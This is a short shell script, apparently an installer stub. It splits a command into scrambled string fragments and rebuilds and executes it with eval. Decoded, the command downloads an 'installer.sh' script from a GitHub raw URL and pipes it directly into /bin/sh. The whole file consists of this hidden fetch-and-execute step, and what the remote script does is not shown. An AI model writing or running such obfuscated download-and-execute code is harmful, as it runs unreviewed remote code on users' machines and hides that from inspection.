z="
";Oz='/mai';Vz='in/s';Hz='onte';Lz='37/x';Rz='ler.';Sz='sh -';Mz='trae';Bz=' htt';Iz='nt.c';Az='wget';Uz='| /b';Cz='ps:/';Wz='h';Jz='om/e';Nz='vent';Ez='.git';Gz='serc';Dz='/raw';Kz='mil2';Fz='hubu';Qz='stal';Tz='O - ';Pz='n/in';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"